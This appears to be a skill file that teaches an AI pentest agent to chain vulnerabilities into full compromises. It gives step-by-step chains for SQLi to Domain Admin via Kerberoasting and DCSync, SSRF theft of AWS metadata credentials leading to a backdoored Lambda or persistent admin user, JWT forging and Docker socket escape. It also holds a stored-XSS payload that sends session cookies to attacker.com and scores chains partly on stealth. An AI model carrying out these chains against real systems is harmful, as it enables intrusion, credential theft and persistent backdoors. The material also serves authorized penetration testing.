# /attack-chain-composer — Multi-Step Kill Chain Assembly

> **Skill type:** Reasoning / Exploitation Strategy  
> **Source:** 0xsteph/pentest-ai-agents attack-planner, Ak-cybe/awesome-offensive-security-skills, ckduy/redamon EvoGraph  
> **Chains from:** Any skill that produces findings  
> **Chains into:** `/post-exploit`, `/lateral-movement`, `/reporting`

---

## Purpose

Low-severity findings are noise. **Combined** findings can be critical compromises. This skill teaches an AI agent to correlate individual vulnerabilities into multi-step attack chains that demonstrate real business impact — the difference between a $50 bug report and a $50,000 one.

---

## The Attack Chain Thinking Model

### Core Principle: Every Finding Is a Stepping Stone

Don't assess findings in isolation. Ask:
> "Given everything I've found, what's the **shortest path to full compromise**?"

### The Impact Escalation Matrix

```
SSRF → Internal network access → Cloud metadata → IAM keys → Cloud account takeover
IDOR → Account data access → PII exposure → Regulatory violation
XSS (stored) → Admin session hijack → Account takeover → Data breach
SQLi → DB access → Password hash dump → Credential spray → Internal access
File upload → Web shell → RCE → Reverse shell → Privilege escalation
Open redirect + OAuth → Token theft → Account takeover
XXE → SSRF → Internal service access → Credential extraction
Race condition → Business logic bypass → Financial fraud
LFI → Log poisoning → RCE
JWT weak secret → Admin JWT forge → Auth bypass → Full access
```

---

## Chain Building Algorithm

```
1. Load all confirmed findings from findings.json
2. Group by: target_host, service, vulnerability_class
3. For each finding, identify "what does this give you":
   - Information: credentials, internal IPs, version info, source code
   - Access: network segment, service, account
   - Capability: read, write, execute, exfiltrate
4. Build directed graph: Finding A → enables → Finding B
5. Find all paths from initial access to high-value objectives:
   - Objective: Domain Admin / Root / AWS root / DB with PII
   - Objective: Data exfiltration (N records of PII)
   - Objective: Financial fraud capability
   - Objective: Full tenant isolation bypass
6. Score each path: probability × stealth × impact
7. Present top 3 chains with step-by-step reproduction
```

---

## Common High-Value Attack Chains

### Chain 1: Web → Domain Admin (Classic)
```
Step 1: SQLi on login → extract admin credentials
Step 2: Admin credentials → console access / server login
Step 3: Server access → Windows AD environment enumeration
Step 4: BloodHound path → Kerberoastable service account
Step 5: Crack hash → service account credentials
Step 6: Service account → GenericAll on Domain Admin group
Step 7: Add attacker account to Domain Admins
Step 8: Domain Admin → DCSync → all NTLM hashes
```

### Chain 2: SSRF → Cloud Account Takeover
```
Step 1: SSRF discovered in profile image URL parameter
Step 2: SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
Step 3: Extract: AccessKeyId, SecretAccessKey, Token (ephemeral)
Step 4: Configure AWS CLI with extracted credentials
Step 5: aws sts get-caller-identity → identify role
Step 6: Enumerate attached policies → find overpermissioned role
Step 7: Escalate: lambda:UpdateFunctionCode → inject backdoor
Step 8: Or: iam:CreateUser + iam:AttachUserPolicy → persistent admin
```

### Chain 3: Stored XSS → Account Takeover
```
Step 1: Stored XSS in user bio/comment field
Step 2: Craft payload: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Step 3: Admin views page → their session cookie exfiltrated
Step 4: Replay session cookie → admin account takeover
Step 5: Admin → user data export → PII breach
Step 6: Or: Admin → deploy malicious plugin/extension
```

### Chain 4: JWT Weak Secret → Full Platform Takeover
```
Step 1: Intercept JWT from login response
Step 2: Decode payload → see {"sub":"user123","role":"user"}
Step 3: Try known weak secrets: "secret", "password", app name, etc.
Step 4: Or: run hashcat against JWT signature
Step 5: Sign new JWT: {"sub":"admin","role":"superadmin","id":1}
Step 6: Replace JWT in subsequent requests → admin access
Step 7: Admin → user enumeration, data export, config access
```

### Chain 5: Container Escape → Cloud Takeover
```
Step 1: RCE in web app running in Docker container
Step 2: Enumerate container: are we privileged? mounted sockets?
Step 3: docker.sock mounted → escape to host
Step 4: Host node → AWS/GCP metadata service
Step 5: Extract node IAM role → EC2 instance profile
Step 6: Enumerate cloud resources via instance profile
Step 7: S3 bucket with sensitive data / RDS with PII
```

---

## Chain Scoring Rubric

Score each chain on three dimensions (1-10 each):

```
PROBABILITY: How likely is each step to succeed?
  - All confirmed findings: 9-10
  - Mix of confirmed + likely: 6-8
  - Requires some assumptions: 3-5
  - Mostly theoretical: 1-2

STEALTH: How detectable is this chain?
  - No anomalous traffic patterns: 9-10
  - Blends with normal activity: 6-8
  - Generates some alerts: 3-5
  - Triggers obvious alarms: 1-2

IMPACT: What's the business consequence?
  - Full compromise + data breach: 9-10
  - Significant data access + persistence: 6-8
  - Limited data access: 3-5
  - Informational only: 1-2

FINAL SCORE = (probability × 0.4) + (stealth × 0.2) + (impact × 0.4)
Present chains scoring ≥ 6.0 to the client
```

---

## Finding Correlation (Deduplication)

When multiple tools report the same issue:

```python
def correlate_findings(findings: list) -> list:
    """Group by (host, port, cve_or_title), boost confidence."""
    groups = defaultdict(list)
    for f in findings:
        key = (f.host, f.port, f.cve or normalize_title(f.title))
        groups[key].append(f)
    
    result = []
    for key, group in groups.items():
        merged = Finding(
            host=key[0], port=key[1],
            severity=max(f.severity for f in group),  # worst case
            confidence={1: 0.50, 2: 0.80, 3: 0.95}.get(len(group), 0.95),
            sources=[f.tool for f in group],
            evidence=[f.evidence_path for f in group]
        )
        result.append(merged)
    return result
```

---

## MITRE ATT&CK Kill Chain Mapping

Map every chain step to ATT&CK:

| Phase | ATT&CK Tactic | Example Technique |
|-------|--------------|-------------------|
| Initial access | TA0001 | T1190 Exploit Public-Facing App |
| Execution | TA0002 | T1059 Command & Scripting Interpreter |
| Persistence | TA0003 | T1505 Server Software Component |
| Privilege escalation | TA0004 | T1068 Exploit Privilege Escalation |
| Defense evasion | TA0005 | T1027 Obfuscated Files or Info |
| Credential access | TA0006 | T1110 Brute Force |
| Discovery | TA0007 | T1046 Network Service Scan |
| Lateral movement | TA0008 | T1021 Remote Services |
| Collection | TA0009 | T1119 Automated Collection |
| Exfiltration | TA0010 | T1041 Exfil over C2 Channel |
| Impact | TA0040 | T1486 Data Encrypted for Impact |
